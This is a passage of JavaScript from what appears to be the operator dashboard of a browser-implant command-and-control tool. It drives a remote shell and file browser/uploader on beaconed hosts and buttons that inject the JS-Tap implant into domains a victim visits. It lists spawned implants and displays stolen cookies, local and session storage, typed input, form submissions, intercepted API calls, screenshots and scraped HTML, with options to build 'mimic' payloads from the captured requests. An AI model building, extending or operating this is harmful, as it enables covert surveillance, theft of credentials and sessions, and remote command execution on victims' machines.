    '#title-input { background:transparent; border:1px solid #555; color:#ddd; font-size:14px; flex:1; padding:2px 6px; border-radius:3px; font-family:monospace; }' +
    '#title-input:focus { outline:none; border-color:#6c9; }' +
    '#output { flex:1; overflow-y:auto; padding:8px 12px; }' +
    '#input-bar { display:flex; align-items:center; padding:6px 12px; background:#252525; border-top:1px solid #444; gap:6px; }' +
    '#prompt { color:#6c9; white-space:nowrap; }' +
    '#cmd-input { flex:1; background:transparent; border:1px solid #555; color:#ddd; font-family:monospace; font-size:14px; padding:4px 6px; border-radius:3px; }' +
    '#cmd-input:focus { outline:none; border-color:#6c9; }' +
    '.btn-shell { background:#444; color:#ddd; border:1px solid #666; padding:4px 12px; border-radius:3px; cursor:pointer; font-size:13px; }' +
    '.btn-shell:hover { background:#555; }' +
    '</style></head><body>' +
    '<div id="title-bar"><span style="color:#6c9;font-weight:bold;">&#9638;</span>' +
    '<input id="title-input" value="' + escapeHTML(titleText).replace(/"/g, '&quot;') + '" oninput="document.title=this.value"></div>' +
    '<div id="output">' + transferState.output + '</div>' +
    '<div id="input-bar">' +
    '<span id="prompt">' + escapeHTML((transferState.cwd || '~') + ' $ ') + '</span>' +
    '<input id="cmd-input" type="text" autofocus>' +
    '<button class="btn-shell" id="run-btn">Run</button>' +
    '</div>' +
    '<script>' +
    '(function(){' +
    'var beaconId=' + JSON.stringify(transferState.beaconId) + ';' +
    'var cwd=' + JSON.stringify(transferState.cwd) + ';' +
    'var history=' + JSON.stringify(transferState.history) + ';' +
    'var histIdx=history.length;' +
    'var accOutput=document.getElementById("output").innerHTML;' +
    'function esc(s){if(!s)return"";return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;").replace(/\'/g,"&#039;");}' +
    'function appendOut(h){accOutput+=h;var o=document.getElementById("output");o.innerHTML=accOutput;o.scrollTop=o.scrollHeight;}' +
    'function removeRunning(rid){var re=new RegExp(\'<div [^>]*id="shell-running-\'+rid.replace(/[.*+?^${}()|[\\]\\\\]/g,"\\\\$&")+\'"[^>]*>.*?</div>\');accOutput=accOutput.replace(re,"");var el=document.getElementById("shell-running-"+rid);if(el)el.remove();}' +
    'function updatePrompt(){var p=document.getElementById("prompt");p.textContent=(cwd||"~")+" $ ";}' +
    'function pollResult(reqId,cb,att){att=att||0;if(att>60){cb({success:false,error:"Timed out"});return;}var d=att<5?1000:3000;setTimeout(async function(){try{var r=await fetch("/api/sidecar/result/"+reqId);var j=await r.json();if(j.ready){cb(j);}else{pollResult(reqId,cb,att+1);}}catch(e){cb({success:false,error:"Poll failed: "+e});}},d);}' +
    'async function runCmd(){var inp=document.getElementById("cmd-input");var raw=inp.value;if(!raw.trim())return;inp.value="";history.push(raw);histIdx=history.length;' +
    'var cwdEsc=cwd.replace(/\'/g,"\'\\\\\'\'");var wrapped;' +
    'if(cwd){wrapped="cd \'"+cwdEsc+"\' && "+raw+"; echo \'__SIDECAR_CWD__\'; pwd";}else{wrapped=raw+"; echo \'__SIDECAR_CWD__\'; pwd";}' +
    'var pt=esc((cwd||"~")+" $ "+raw);var rid=Date.now()+""+Math.random();' +
    'appendOut(\'<div style="color:#6c9;white-space:pre-wrap;">\'+pt+"</div>");' +
    'appendOut(\'<div id="shell-running-\'+rid+\'" style="color:#888;"><span style="display:inline-block;width:12px;height:12px;border:2px solid #888;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;"></span> Running...</div>\');' +
    'try{var resp=await fetch("/api/sidecar/command",{method:"POST",body:JSON.stringify({beaconID:beaconId,command:"exec_cmd",args:{command:wrapped}}),headers:{"Content-type":"application/json"}});' +
    'if(!resp.ok){var et=await resp.text();removeRunning(rid);appendOut(\'<div style="color:#f55;white-space:pre-wrap;">ERROR: \'+esc(et)+"</div>");return;}' +
    'var json=await resp.json();pollResult(json.requestId,function(result){removeRunning(rid);if(!result.success){appendOut(\'<div style="color:#f55;white-space:pre-wrap;">ERROR: \'+esc(result.error||"Unknown error")+"</div>");return;}' +
    'var stdout=(result.data&&result.data.stdout)||"";var stderr=(result.data&&result.data.stderr)||"";' +
    'var mk="__SIDECAR_CWD__";var mi=stdout.lastIndexOf(mk);' +
    'if(mi!==-1){var co=stdout.substring(0,mi).replace(/\\n$/,"");var nc=stdout.substring(mi+mk.length).trim();if(nc)cwd=nc;if(co)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(co)+"</div>");}' +
    'else{if(stdout)appendOut(\'<div style="color:#ddd;white-space:pre-wrap;">\'+esc(stdout)+"</div>");}' +
    'if(stderr)appendOut(\'<div style="color:#f55;white-space:pre-wrap;">\'+esc(stderr)+"</div>");updatePrompt();});}' +
    'catch(e){removeRunning(rid);appendOut(\'<div style="color:#f55;white-space:pre-wrap;">Request failed: \'+esc(String(e))+"</div>");}}' +
    'document.getElementById("cmd-input").addEventListener("keydown",function(ev){if(ev.key==="Enter"){runCmd();}else if(ev.key==="ArrowUp"){ev.preventDefault();if(histIdx>0){histIdx--;this.value=history[histIdx];}}else if(ev.key==="ArrowDown"){ev.preventDefault();if(histIdx<history.length-1){histIdx++;this.value=history[histIdx];}else{histIdx=history.length;this.value="";}}});' +
    'document.getElementById("run-btn").addEventListener("click",runCmd);' +
    'var o=document.getElementById("output");o.scrollTop=o.scrollHeight;' +
    '})();' +
    '</script>' +
    '<style>@keyframes spin{to{transform:rotate(360deg)}}</style>' +
    '</body></html>';

    popWin.document.write(htmlContent);
    popWin.document.close();
}


async function sidecarReadFile(beaconId, path) {
    var resultsDiv = document.getElementById('sidecar-file-results');
    if (!resultsDiv) return;
    resultsDiv.innerHTML = '<div class="spinner-border spinner-border-sm text-primary" role="status"></div> Reading file...';

    try {
        var resp = await fetch('/api/sidecar/command', {
            method: 'POST',
            body: JSON.stringify({ beaconID: beaconId, command: 'read_file', args: { path: path } }),
            headers: { "Content-type": "application/json" }
        });

        if (!resp.ok) {
            var errText = await resp.text();
            resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(errText) + '</div>';
            return;
        }

        var json = await resp.json();
        pollSidecarResult(json.requestId, function(result) {
            if (!result.success) {
                resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">' + escapeHTML(result.error || 'Unknown error') + '</div>';
                return;
            }
            var content = '';
            try { content = atob(result.data.content); } catch(e) { content = result.data.content || ''; }

            // Store for download
            _sidecarLastReadContent = result.data.content;
            var pathParts = path.replace(/\\/g, '/').split('/');
            _sidecarLastReadFileName = pathParts[pathParts.length - 1] || 'download';

            var backBtn = '<button class="btn btn-outline-secondary btn-sm mb-2" onclick="sidecarBrowse(\'' + beaconId + '\')">Back to directory</button>';
            var dlBtn = ' <button class="btn btn-outline-primary btn-sm mb-2" onclick="sidecarDownloadFile()">Download</button>';
            resultsDiv.innerHTML = backBtn + dlBtn +
                '<div class="mb-1"><b>' + escapeHTML(path) + '</b> (' + formatSidecarBytes(result.data.size) + ')' +
                (result.data.truncated ? ' <span class="badge bg-warning text-dark">Truncated</span>' : '') + '</div>' +
                '<pre class="bg-dark text-white p-2" style="max-height: 500px; overflow-y: auto; white-space: pre-wrap; font-size: 0.8em;">' +
                escapeHTML(content) + '</pre>';
        });
    } catch (e) {
        resultsDiv.innerHTML = '<div class="alert alert-danger alert-sm py-1">Request failed: ' + escapeHTML(String(e)) + '</div>';
    }
}


function pollSidecarResult(requestId, callback, attempt) {
    attempt = attempt || 0;
    if (attempt > 60) { // ~3 minutes max
        callback({ success: false, error: "Timed out waiting for result" });
        return;
    }
    // Poll fast initially (1s for first 5 attempts), then slow down (3s)
    var delay = attempt < 5 ? 1000 : 3000;
    setTimeout(async function() {
        try {
            var resp = await fetch('/api/sidecar/result/' + requestId);
            var json = await resp.json();
            if (json.ready) {
                callback(json);
            } else {
                pollSidecarResult(requestId, callback, attempt + 1);
            }
        } catch (e) {
            callback({ success: false, error: "Poll failed: " + String(e) });
        }
    }, delay);
}


function formatSidecarBytes(bytes) {
    if (bytes === undefined || bytes === null) return '';
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
}


async function getClientDetails(id) 
{
    if (refreshingDetails) return;
    refreshingDetails = true;

    try {
        // Get client info to check type
        var clientsReq = await fetch('/api/getClients');
        var clients = await clientsReq.json();
        var client = clients.find(c => c.id == id);

        // Update persistence
        if (client) {
            if (client.clientType === 'bex-beacon') {
                lastSelectedBrowserId = client.id;
            } else {
                lastSelectedAppId = client.id;
            }
        }

        var cardStack = document.getElementById('detail-stack');
        const lootHeader = document.getElementById('loot-header-text');
        
        // Save scroll position
        const scrollPos = cardStack.scrollTop;

        // Update Header Label based on the ACTUAL client being loaded
        if (client && lootHeader) {
            const label = client.clientType === 'bex-beacon' ? "Browser Loot" : "App Loot";
            lootHeader.innerHTML = `<b>&nbsp;&nbsp;${label}</b>`;
        }

        // Only clear if we are switching to a brand NEW client (not a refresh)
        // If we are refreshing the same client, we want to update in-place to avoid flashing
        const isRefresh = (cardStack.getAttribute('data-loaded-id') == id);
        
        if (!isRefresh) {
            while (cardStack.firstChild) {
                cardStack.firstChild.remove();
            }
            cardStack.setAttribute('data-loaded-id', id);

            // Reset sidecar shell state on client switch
            _sidecarCurrentPath = '';
            _sidecarShellCwd = '';
            _sidecarShellHistory = [];
            _sidecarShellHistoryIndex = -1;
            _sidecarShellOutput = '';
            _sidecarShellBeaconId = '';
            _sidecarShellNickname = '';
        }

        if (client && client.clientType === 'bex-beacon') {
            // Handle Beacon View

            // Sidecar panel (if available)
            if (client.sidecarAvailable) {
                let sidecarPanel = document.getElementById('sidecar-panel');
                if (!sidecarPanel) {
                    // Store nickname and beacon id for shell
                    _sidecarShellNickname = client.tag || client.nickname || '';
                    _sidecarShellBeaconId = id;

                    sidecarPanel = document.createElement('div');
                    sidecarPanel.id = 'sidecar-panel';
                    sidecarPanel.setAttribute('data-beacon-id', id);
                    sidecarPanel.className = 'card mb-3 border-secondary';
                    sidecarPanel.innerHTML = `
                        <div class="card-header bg-dark text-white d-flex justify-content-between align-items-center" style="cursor:pointer;" data-bs-toggle="collapse" data-bs-target="#sidecar-collapse" aria-expanded="true" aria-controls="sidecar-collapse">
                            <span><b>Sidecar</b> <span class="badge bg-success">Connected</span></span>
                            <svg id="sidecar-chevron" width="16" height="16" viewBox="0 0 16 16" fill="currentColor" style="transition: transform 0.25s ease;">
                                <path fill-rule="evenodd" d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z"/>
                            </svg>
                        </div>
                        <div class="collapse show" id="sidecar-collapse">
                        <div class="card-body p-2">
                            <ul class="nav nav-tabs" role="tablist">
                                <li class="nav-item">
                                    <button class="nav-link active" data-bs-toggle="tab" data-bs-target="#sidecar-files" type="button">File Browser</button>
                                </li>
                                <li class="nav-item">
                                    <button class="nav-link" data-bs-toggle="tab" data-bs-target="#sidecar-shell" type="button">Shell</button>
                                </li>
                            </ul>
                            <div class="tab-content border border-top-0 p-3">
                                <div class="tab-pane fade show active" id="sidecar-files">
                                    <div class="input-group mb-2">
                                        <input type="text" class="form-control form-control-sm" id="sidecar-path" placeholder="/" value="">
                                        <button class="btn btn-outline-primary btn-sm" onclick="sidecarBrowse('${id}')">Browse</button>
                                    </div>
                                    <div class="d-flex gap-2 mb-2 align-items-center flex-wrap">
                                        <input type="file" class="form-control form-control-sm" id="sidecar-upload-file" style="max-width:250px;">
                                        <button class="btn btn-outline-danger btn-sm" onclick="sidecarUploadFile('${id}')">Upload</button>
                                    </div>
                                    <div id="sidecar-upload-status"></div>
                                    <div id="sidecar-file-results" style="max-height: 400px; overflow-y: auto;"></div>
                                </div>
                                <div class="tab-pane fade" id="sidecar-shell">
                                    <div id="sidecar-shell-output" style="background:#1e1e1e; color:#ddd; font-family:monospace; font-size:13px; max-height:400px; overflow-y:auto; padding:8px 10px; border-radius:4px; margin-bottom:8px;"></div>
                                    <div class="input-group">
                                        <span class="input-group-text bg-dark text-success border-secondary" id="sidecar-shell-prompt" style="font-family:monospace; font-size:13px;">~ $ </span>
                                        <input type="text" class="form-control form-control-sm bg-dark text-white border-secondary" id="sidecar-shell-input" style="font-family:monospace;" placeholder="type a command..." onkeydown="sidecarShellKeyHandler(event, '${id}')">
                                        <button class="btn btn-outline-success btn-sm" onclick="sidecarShellExec('${id}')">Run</button>
                                        <button class="btn btn-outline-secondary btn-sm" onclick="sidecarPopOutShell('${id}')" title="Pop out shell into separate window">Pop Out</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                        </div>
                    `;
                    cardStack.prepend(sidecarPanel);

                    // Chevron rotation on collapse/expand
                    var collapseEl = document.getElementById('sidecar-collapse');
                    if (collapseEl) {
                        collapseEl.addEventListener('hide.bs.collapse', function() {
                            var chev = document.getElementById('sidecar-chevron');
                            if (chev) chev.style.transform = 'rotate(-90deg)';
                        });
                        collapseEl.addEventListener('show.bs.collapse', function() {
                            var chev = document.getElementById('sidecar-chevron');
                            if (chev) chev.style.transform = 'rotate(0deg)';
                        });
                    }

                    // Auto-browse home directory on panel creation
                    sidecarBrowse(id);
                }
            }

            var domainsReq = await fetch('/api/bex/domains/' + id);
            var domains = await domainsReq.json();

            // Fetch active injections
            var injectionsReq = await fetch('/api/bex/injections/' + id);
            var injections = await injectionsReq.json();
            var activeMap = {};
            injections.forEach(i => activeMap[i.domain] = { tag: i.tag, success: i.last_success });

            // Get all clients to find children
            var children = clients.filter(c => c.parentUUID === client.uuid);

            if (domains.length === 0 && !client.sidecarAvailable) {
                cardStack.innerHTML = `
                    <div class="mt-4 p-5 bg-dark text-white rounded text-center">
                        <h3>No Domains Recorded</h3>
                        <p class="text-white-50">This beacon has not reported any domain intelligence yet.</p>
                    </div>
                `;
                return;
            }

            // Sort domains by last seen (most recent first)
            domains.sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));

            for (let d of domains) {
                // Look for existing card to update in-place
                let card = document.getElementById('domain-card-' + d.id);
                let isNew = false;

                if (!card) {
                    isNew = true;
                    card = document.createElement('div');
                    card.className = 'card mb-2';
                    card.id = 'domain-card-' + d.id;
                    card.innerHTML = `
                        <div class="card-body">
                            <div class="header-area d-flex justify-content-between align-items-center mb-2"></div>
                            <div class="stats-area mb-2 text-muted small"></div>
                            <div class="controls-area d-flex justify-content-start gap-2 mb-3"></div>
                            <div class="children-area"></div>
                            <div class="details-area mt-3" style="display: none;" id="domain-details-${d.id}"></div>
                        </div>
                    `;
                }

                const headerArea = card.querySelector('.header-area');
                const statsArea = card.querySelector('.stats-area');
                const controlsArea = card.querySelector('.controls-area');
                const childrenArea = card.querySelector('.children-area');

                // 1. Update Header (Title + Badges)
                let badgeHtml = '';
                if (activeMap[d.domain]) {
                    const info = activeMap[d.domain];
                    const statusColor = info.success ? 'bg-success' : 'bg-warning text-dark';
                    const childForDomain = children.find(c => c.tag === info.tag);
                    const name = childForDomain ? (childForDomain.tag ? `${childForDomain.tag}/${childForDomain.nickname}` : childForDomain.nickname) : null;
                    const nicknameSuffix = name ? ` (${escapeHTML(name)})` : '';
                    const statusText  = info.success ? `SUCCESS: ${escapeHTML(info.tag)}${nicknameSuffix}` : `INJECTING: ${escapeHTML(info.tag)}`;
                    badgeHtml = `<span class="badge ${statusColor}" style="font-size: 0.6em; vertical-align: middle;">${statusText}</span>`;
                }
                headerArea.innerHTML = `<h5 class="card-title mb-0"><b>${escapeHTML(d.domain)}</b> ${badgeHtml}</h5>
                                        <small class="text-muted">Last Seen: ${humanized_time_span(d.lastSeen)}</small>`;

                // 2. Update Stats
                statsArea.innerHTML = `Visits: <b>${d.visitCount}</b>` + 
                    (d.lastUrl ? ` &bull; Last URL: <span class="text-truncate d-inline-block" style="max-width: 300px; vertical-align: bottom;" title="${escapeHTML(d.lastUrl)}">${escapeHTML(d.lastUrl)}</span>` : '');

                // 3. Update Controls (Only if state changed or new)
                const currentActionText = activeMap[d.domain] ? 'Stop Injection' : 'Inject JS-Tap';
                const currentActionClass = activeMap[d.domain] ? 'btn-outline-danger' : 'btn-outline-success';
                
                if (isNew || !controlsArea.querySelector(`.${currentActionClass}`)) {
                    controlsArea.innerHTML = '';
                    
                    const injectBtn = document.createElement('button');
                    injectBtn.style.minWidth = "120px";
                    injectBtn.className = `btn ${currentActionClass} btn-sm`;
                    injectBtn.textContent = currentActionText;
                    injectBtn.onclick = function() { toggleBexInjection(id, d.domain, !!activeMap[d.domain]); };
                    controlsArea.appendChild(injectBtn);

                    const captureBtn = document.createElement('button');
                    captureBtn.style.minWidth = "120px";
                    captureBtn.className = 'btn btn-primary btn-sm';
                    captureBtn.textContent = 'View Details';
                    captureBtn.onclick = function() { toggleDomainDetails(d.id, this); };
                    controlsArea.appendChild(captureBtn);
                }

                // 4. Update Children Summary
                const domainChildren = activeMap[d.domain] ? children.filter(c => c.tag === activeMap[d.domain].tag) : [];
                if (domainChildren.length > 0) {
                    childrenArea.className = 'children-area mt-2 border-top pt-2';
                    childrenArea.innerHTML = `<small class="text-muted">Spawned Implants:</small>`;
                    domainChildren.forEach(child => {
                        const badge = document.createElement('div');
                        badge.className = 'badge bg-dark text-white me-1 p-1';
                        badge.style.cursor = 'pointer';
                        const name = child.tag ? `${escapeHTML(child.tag)}/${escapeHTML(child.nickname)}` : escapeHTML(child.nickname);
                        badge.innerHTML = `<small>${name}</small>`;
                        badge.onclick = (e) => {
                            e.stopPropagation();
                            document.getElementById('toggleApps').click();
                            setTimeout(() => {
                                const childCard = document.getElementById('clientCard' + child.id);
                                if (childCard) childCard.click();
                            }, 100);
                        };
                        childrenArea.appendChild(badge);
                    });
                } else {
                    childrenArea.innerHTML = '';
                    childrenArea.className = 'children-area';
                }

                if (isNew) {
                    cardStack.appendChild(card);
                }
            }
            // Restore scroll position
            if (scrollPos > 0) {
                cardStack.scrollTop = scrollPos;
            }
            return;
        }

        // Get high level event stack for client (Standard Implant)
        var req = await fetch('/api/clientEvents/' + id);
        var jsonResponse = await req.json();


        // Let's get event details for each event
        for (let i = 0; i < jsonResponse.length; i++)
        {
            event = jsonResponse[i];
            var eventKey = event.eventID;

            var card = document.createElement('div');
            card.className ='card';

            var cardBody = document.createElement('div');
            cardBody.className = 'card-body';

            var cardTitle = document.createElement('h5');
            cardTitle.className = "card-title";

            var cardSubtitle = document.createElement('h6');

            // Add tooltip
            cardSubtitle.className = "card-subtitle mb-2 text-muted";
            cardSubtitle.setAttribute("data-toggle", "tooltip")
            cardSubtitle.setAttribute("title", event.timeStamp);
            cardSubtitle.setAttribute("data-placement", "left");
            const tooltipOptions = {
            animation: true, // Optional: Enable tooltip animation
            delay: { show: 300, hide: 100 }, // Optional: Set tooltip show/hide delay in milliseconds
            container: cardSubtitle // Optional: Specify a container for the tooltip
        };
        new bootstrap.Tooltip(cardSubtitle, tooltipOptions);


        var cardText = document.createElement('p');
        cardText.className = 'card-text';

        var activeEvent = false;


            // Handle event specific details and formatting
        switch(event.eventType)
        {
        case 'COOKIE':
            if (document.getElementById('cookieEvents').checked == true)
            {
                activeEvent = true;
                cookieReq  = await fetch('/api/clientCookie/' + eventKey);
                cookieJson = await cookieReq.json();

                cardTitle.innerHTML = "Cookie";
                cardText.innerHTML  = "Cookie Name: <b>" + cookieJson.cookieName + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Cookie Value: <b>" + cookieJson.cookieValue + "</b>";
            }
            break;

        case 'LOCALSTORAGE':
            if (document.getElementById('localStorageEvents').checked == true)
            {
                activeEvent = true;
                localStorageReq  = await fetch('/api/clientLocalStorage/' + eventKey);
                localStorageJson = await localStorageReq.json();

                // console.log("*** Local storage api call received: ");
                // console.log(JSON.stringify(localStorageJson));
                cardTitle.innerHTML = "Local Storage";
                cardText.innerHTML  = "Key: <b>" + localStorageJson.localStorageKey + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Value: <b>" + localStorageJson.localStorageValue + "</b>";
            }
            break;

        case 'SESSIONSTORAGE':
            if (document.getElementById('sessionStorageEvents').checked == true)
            {
                activeEvent = true;
                sessionStorageReq  = await fetch('/api/clientSessionStorage/' + eventKey);
                sessionStorageJson = await sessionStorageReq.json();

                cardTitle.innerHTML = "Session Storage";
                cardText.innerHTML  = "Key: <b>" + sessionStorageJson.sessionStorageKey + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Value: <b>" + sessionStorageJson.sessionStorageValue + "</b>";
            }
            break;

        case 'URLVISITED':
            if (document.getElementById('urlEvents').checked == true)
            {
                activeEvent = true;
                urlVisitedReq  = await fetch('/api/clientUrl/' + eventKey);
                urlVisitedJson = await urlVisitedReq.json();

                cardTitle.innerHTML = "URL Visited";
                cardText.innerHTML  = "URL: <b>" + urlVisitedJson.url + "</b>";
            }
            break;

        case 'HTML':
            if (document.getElementById('htmlScrapeEvents').checked == true)
            {
                activeEvent = true;
                cardTitle.innerHTML = "HTML Scraped";
                cardText.innerHTML  = "HTML exfiltrated from page.<br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick=showHtmlCode(' + `'` + eventKey + `'`+ ')>View Code</button>';
            }
            break;

        case 'SCREENSHOT':
            if (document.getElementById('screenshotEvents').checked == true)
            {
                activeEvent = true;
                screenshotReq  = await fetch('/api/clientScreenshot/' + eventKey);
                screenshotJson = await screenshotReq.json();

                cardTitle.innerHTML = "Screenshot";
                cardText.innerHTML  = '<img src="' + screenshotJson.fileName + '" class="img-fluid" alt="Responsive image">';
            }
            break;

        case 'USERINPUT':
            if (document.getElementById('userInputEvents').checked == true)
            {
                activeEvent = true;
                userInputReq  = await fetch('/api/clientUserInput/' + eventKey);
                userInputJson = await userInputReq.json();

                cardTitle.innerHTML = "User Input";
                cardText.innerHTML  = "Input Name: <b>" + userInputJson.inputName + "</b>";
                cardText.innerHTML += "<br>";
                cardText.innerHTML += "Input Value: <b>" + userInputJson.inputValue + "</b>";
            }
            break;

        case 'FORMPOST':
            if (document.getElementById('formPostEvents').checked == true)
            {
                activeEvent = true;
                formPostReq  = await fetch('/api/clientFormPostDetail/' + eventKey);
                formPostJson = await formPostReq.json();

                cardTitle.innerHTML = "Network Form Submission";
                cardText.innerHTML  = "Form submission intercepted from browser networking API.<br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showExfilViewer(' + `'` + eventKey + `'`+ ')>View Submission</button>';
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick=showMimicFormModal(' + `'` + eventKey + `','` + JSON.stringify(formPostJson) + `'` + ')>Create Mimic Payload</button>';
            }
            break;

        case 'XHRAPICALL':
            if (document.getElementById('apiEvents').checked == true)
            {
                activeEvent = true;
                xhrCallReq  = await fetch('/api/clientXhrApiCall/' + eventKey);
                xhrCallJson = await xhrCallReq.json();

                cardTitle.innerHTML = "Network API Call (XHR)";
                cardText.innerHTML  = "Network API call intercepted via XHR monkeypatching.<br><br>";
                cardText.innerHTML += "URL: <b>" + xhrCallJson.url + "</b><br>";
                cardText.innerHTML += "Method: <b>" + xhrCallJson.method + "</b><br>";
                cardText.innerHTML += "Status Code: <b>" + xhrCallJson.responseStatus + "</b><br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showReqRespViewer(' + `'` + eventKey + `','XHR'`+ ')>View Details</button>';
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick=showMimicApiModal(' + `'` + eventKey + `','` + JSON.stringify(xhrCallJson) + `','XHR'` + ')>Create Mimic Payload</button>';
            }
            break;

        case 'FETCHAPICALL':
            if (document.getElementById('apiEvents').checked == true)
            {
                activeEvent = true;
                fetchCallReq  = await fetch('/api/clientFetchApiCall/' + eventKey);
                fetchCallJson = await fetchCallReq.json();

                cardTitle.innerHTML = "Network API Call (Fetch)";
                cardText.innerHTML  = "Network API call intercepted via Fetch monkeypatching.<br><br>";
                cardText.innerHTML += "URL: <b>" + fetchCallJson.url + "</b><br>";
                cardText.innerHTML += "Method: <b>" + fetchCallJson.method + "</b><br>";
                cardText.innerHTML += "Status Code: <b>" + fetchCallJson.responseStatus + "</b><br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm me-2" onclick=showReqRespViewer(' + `'` + eventKey + `','FETCH'`+ ')>View Details</button>';
                cardText.innerHTML += '<button type="button" class="btn btn-primary btn-sm" onclick=showMimicApiModal(' + `'` + eventKey + `','` + JSON.stringify(fetchCallJson) + `','FETCH'` + ')>Create Mimic Payload</button>';
            }
            break;

        case 'CUSTOMEXFIL':
            if (document.getElementById('customExfilEvents').checked == true)
            {
                activeEvent = true;
                cardTitle.innerHTML = "Custom Payload Exfiltrated Data";
                cardText.innerHTML  = "Data sent back from a custom C2 payload.<br><br>";
                cardText.innerHTML += '<button type="button" class="btn btn-primary" onclick=showExfilViewer(' + `'` + eventKey + `'`+ ')>View Data</button>';
            }
            break;

        default:
            console.log("Error: unknown event type received from server: " + event.eventType);
        }


        if (activeEvent)
        {
            cardSubtitle.innerHTML  = "Event Time: <b>" + humanized_time_span(event.timeStamp) + "</b>";

            cardBody.appendChild(cardTitle);
            cardBody.appendChild(cardSubtitle);
            cardBody.appendChild(cardText);

            card.appendChild(cardBody);
            cardStack.appendChild(card);
        }
        }
        // Restore scroll position
        if (scrollPos > 0) {
            cardStack.scrollTop = scrollPos;
        }
    } finally {
        refreshingDetails = false;
    }
}





function unselectAllClients()
{
	// Remove detail cards
	detailCardStack = document.getElementById('detail-stack');
	detailCardStack.classList.remove('ghost-loot');

	while (detailCardStack.firstChild)
	{
		detailCardStack.firstChild.remove();
	}

	// Unselect client cards
	clientCardStack = document.getElementById('client-stack');
	var cards = clientCardStack.querySelectorAll('.card');
	for (let i = 0; i < cards.length; i++)
	{
		cards[i].classList.remove("table-active");
	}
}



function parseDate(dateString)
{
	return new Date(dateString);
}



// Sort client json based on current sorting config
function sortClients(clientsJson)
{
	// console.log("Top of clients sort...");

	// We need to get the sorting settings

	var button = document.getElementById("firstSeenAscending");

	var firstSeenAscending  = document.getElementById("firstSeenAscending").checked;
	var firstSeenDescending = document.getElementById("firstSeenDescending").checked;
	var lastSeenAscending   = document.getElementById("lastSeenAscending").checked;
	var lastSeenDescending  = document.getElementById("lastSeenDescending").checked;

	if (firstSeenAscending == true)
	{
		// console.log("** First Seen Ascending");
		// Default database ordering
		return clientsJson;
	}
	else if (firstSeenDescending == true)
	{
		// console.log("** First Seen Descending");

		// Reverse database ordering
		const reversedClients = clientsJson.reverse();
		return reversedClients;
	}
	else if (lastSeenAscending == true)
	{
		// console.log("** Last Seen Ascending");

		const sortedClients = clientsJson.sort((a, b) => parseDate(a.lastSeen) - parseDate(b.lastSeen));

		// for (let i = 0; i < sortedClients.length; i++)
		// {
		// 	console.log("i: " + i + ", last seen: " + sortedClients[i].lastSeen + ", converted: " + humanized_time_span(sortedClients[i].lastSeen));
		// }
		return sortedClients;
	}
	else if (lastSeenDescending == true)
	{
		// console.log("** Last Seen Descending");

		const sortedClients = clientsJson.sort((a, b) => parseDate(a.lastSeen) - parseDate(b.lastSeen));

		// for (let i = 0; i < sortedClients.length; i++)
		// {
		// 	console.log("i: " + i + ", last seen: " + sortedClients[i].lastSeen + ", converted: " + humanized_time_span(sortedClients[i].lastSeen));
		// }

		sortedClients.reverse();
		return sortedClients;
	}
	else
	{
		console.log("!!!!! Error, shouldn't be here in sortClients...");
	}
}


function filterClients(clientsJson)
{
	var searchBar   = document.getElementById('searchClientInput');
	var searchTerm  = searchBar.value.toLowerCase();
	var cardStack   = document.getElementById('client-stack');
	var clientCards = cardStack.getElementsByClassName('card');

	var notSearch = false;

	if (searchTerm.startsWith('!'))
	{
		notSearch = true;
		searchTerm = searchTerm.slice(1);
	}


	for (let i = clientsJson.length - 1; i >= 0; i--)
	{
		var clientTag         = clientsJson[i].tag.toLowerCase();
		var clientName        = clientsJson[i].nickname.toLowerCase();
		var clientIP          = clientsJson[i].ip;
		var clientFingerprint = clientsJson[i].fingerprint?.toLowerCase() || ""; // sometimes null
		var clientPlatform    = clientsJson[i].platform.toLowerCase();
		var clientBrowser     = clientsJson[i].browser.toLowerCase();

		var cleanedString = clientTag + clientName + clientIP + clientFingerprint + clientPlatform + clientBrowser;

		if (notSearch)
		{
			// Hide the client if it DOES match the search term
			if (cleanedString.includes(searchTerm))
			{
				clientsJson.splice(i, 1);
			}
		}
		else
		{
			// Hide the client if it doesn't match the search term
			if (cleanedString.indexOf(searchTerm) == -1)
			{
				// We need to whack this one
				clientsJson.splice(i, 1);
			}
		}
	}

	return clientsJson;
}



// Throttle helper: ensures a function is only called at most once every delay milliseconds.
function throttle(func, delay) {
  let lastCall = 0;
  return function(...args) {
    const now = Date.now();
    if (now - lastCall < delay) {
      return;
    }
    lastCall = now;
    return func(...args);
  };
}


const throttledUpdateClients = throttle(() => {
  clientLoadExtraCount += clientIncrementAmount;
  updateClients();
}, 2000);





async function updateClients()
{
	console.log("Updating clients...");
	// Get client info
	var req         = await fetch('/api/getClients');
	var clientsJson = await req.json();

	var fingerprintReq  = await fetch('/api/app/getShowFingerprintSetting');
	var fingerprintJson = await fingerprintReq.json();

    // Update Navbar Stats
    const appCount = clientsJson.filter(c => c.clientType !== 'bex-beacon').length;
    const browserCount = clientsJson.filter(c => c.clientType === 'bex-beacon').length;
    const statsEl = document.getElementById('client-stats');
    if (statsEl) {
        statsEl.innerHTML = `Apps: <b>${appCount}</b> &nbsp;|&nbsp; Browsers: <b>${browserCount}</b>`;
    }

	// Start setting up the client cards
	var cardStack = document.getElementById('client-stack');




